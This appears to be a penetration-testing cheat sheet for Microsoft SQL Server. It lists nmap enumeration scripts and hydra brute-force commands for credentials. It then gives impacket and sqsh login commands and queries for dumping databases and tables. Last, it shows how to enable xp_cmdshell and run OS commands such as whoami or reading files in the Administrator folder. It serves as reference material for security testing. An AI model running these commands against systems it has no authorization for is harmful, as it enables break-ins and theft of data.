---
title: MSSQL (Microsoft SQL) Pentesting
description: MSSQL is a relational database management system. A default port is 1433.
tags:
    - Database
    - Windows
refs:
date: 2023-03-04
draft: false
---

## Enumeration

```sh
nmap --script ms-sql-info -p 1433 <target-ip>
nmap --script ms-sql-config -p 1433 <target-ip>
nmap --script ms-sql-empty-password,ms-sql-xp-cmdshell -p 1433 <target-ip>
nmap --script ms-sql-* -p 1433 <target-ip>
```

### Brute Force Credentials

```sh
hydra -L usernames.txt –p password <target-ip> mssql
hydra -l username –P passwords.txt <target-ip> mssql
```

<br />

## Connect

### Impacket

```sh
# impacket
impacket-mssqlclient -port 1433 DOMAIN/username:password@<target-ip>
impacket-mssqlclient -port 1433 DOMAIN/username:password@<target-ip> -windows-auth

# sqsh
sqsh -S <target-ip> -U username -P password
sqsh -S <target-ip> -U username -P password -D database
```

<br />

## Commands

```sh
# Switch to the database
> USE <database>

# Get databases
> SELECT * FROM master.dbo.sysdatabases

# List tables
> SELECT * FROM information_schema.tables

# Get table content
> SELECT * FROM <database_name>.dbo.<table_name>
```

<br />

## Spawn a Windows Command Shell and Run Commands using Impacket

If we connected MSSQL using **impacket**, we can exeucte the Windows Shell Commands by **"enable_xp_cmdshell"**.

### Enable/Disable a Windows Shell

```powershell
> enable_xp_cmdshell
> disable_xp_cmdshell
```

### Commands

We can execute commands the same as Windows Command Prompt.

```powershell
# Get current user
> xp_cmdshell whoami

# Show files and directories
> xp_cmdshell dir
> xp_cmdshell dir \Users
# Show hidden files
> xp_cmdshell dir /a

# Get current directory
> xp_cmdshell cd

# Get contents of file
> xp_cmdshell more \Users\Administrator\example.txt
> xp_cmdshell type \Users\Administrator\example.txt
```